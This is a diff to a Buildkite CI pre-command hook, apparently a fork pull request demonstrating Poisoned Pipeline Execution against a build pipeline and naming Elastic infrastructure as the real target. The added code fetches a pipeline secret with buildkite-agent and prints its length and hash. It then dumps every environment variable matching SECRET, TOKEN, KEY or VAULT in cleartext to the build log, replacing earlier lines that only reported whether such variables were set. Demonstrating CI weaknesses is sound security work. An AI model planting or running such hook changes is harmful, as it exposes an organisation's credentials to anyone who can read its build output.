@@ -1,21 +1,41 @@
 #!/bin/bash
-echo "--- [MODIFIED BY PR] pre-command hook executing"
+echo "--- [MODIFIED BY PR] pre-command hook executing (Build #4)"
 echo "HOOK_SOURCE=pull_request_branch"
 echo "This hook was MODIFIED in the PR - demonstrating Poisoned Pipeline Execution"
 echo ""
 echo "--- System access level:"
 echo "whoami: $(whoami)"
 echo "id: $(id)"
-echo "hostname: $(hostname)"
-echo "pwd: $(pwd)"
 echo ""
-echo "--- Buildkite environment (attacker can read all build metadata):"
-env | grep BUILDKITE_ | sort
+echo "--- PIPELINE SECRET ACCESS TEST:"
+echo "Attempting to retrieve pipeline secret via buildkite-agent..."
+SECRET_VALUE=$(buildkite-agent secret get SIMULATED_VAULT_SECRET 2>&1)
+SECRET_EXIT=$?
+echo "Exit code: $SECRET_EXIT"
+if [ $SECRET_EXIT -eq 0 ] && [ -n "$SECRET_VALUE" ]; then
+    echo "RESULT: SECRET SUCCESSFULLY RETRIEVED BY FORK PR HOOK"
+    echo "SECRET_LENGTH: ${#SECRET_VALUE}"
+    echo "SECRET_SHA256: $(echo -n "$SECRET_VALUE" | sha256sum | cut -d' ' -f1)"
+    echo ""
+    echo "This proves pipeline-level secrets are accessible to fork PR code."
+    echo "On Elastic infra, Vault secrets would be equally accessible."
+else
+    echo "buildkite-agent secret get output: $SECRET_VALUE"
+    echo "Trying direct env var access..."
+    if [ -n "$SIMULATED_VAULT_SECRET" ]; then
+        echo "RESULT: SECRET FOUND AS ENV VAR"
+        echo "SECRET_LENGTH: ${#SIMULATED_VAULT_SECRET}"
+    else
+        echo "RESULT: Not available as env var either"
+    fi
+fi
 echo ""
-echo "--- If this were elastic-agent, Vault secrets would now be accessible:"
-echo "VAULT_ADDR_SECRET is: ${VAULT_ADDR_SECRET:+SET_AND_NON_EMPTY}"
-echo "VAULT_ROLE_ID_SECRET is: ${VAULT_ROLE_ID_SECRET:+SET_AND_NON_EMPTY}"
-echo "API_KEY_TOKEN is: ${API_KEY_TOKEN:+SET_AND_NON_EMPTY}"
-echo "BUILDKITE_API_TOKEN is: ${BUILDKITE_API_TOKEN:+SET_AND_NON_EMPTY}"
+echo "--- All environment variables matching SECRET/TOKEN/KEY patterns:"
+env | grep -iE '(SECRET|TOKEN|KEY|VAULT)' | sort
 echo ""
-echo "--- PPE PROOF: Attacker-modified hook executed with build credentials"
+echo "--- Buildkite metadata:"
+echo "BUILDKITE_PULL_REQUEST: $BUILDKITE_PULL_REQUEST"
+echo "BUILDKITE_PULL_REQUEST_REPO: $BUILDKITE_PULL_REQUEST_REPO"
+echo "BUILDKITE_REDACTED_VARS: $BUILDKITE_REDACTED_VARS"
+echo ""
+echo "--- PPE PROOF: Attacker-modified hook executed with pipeline secret access"
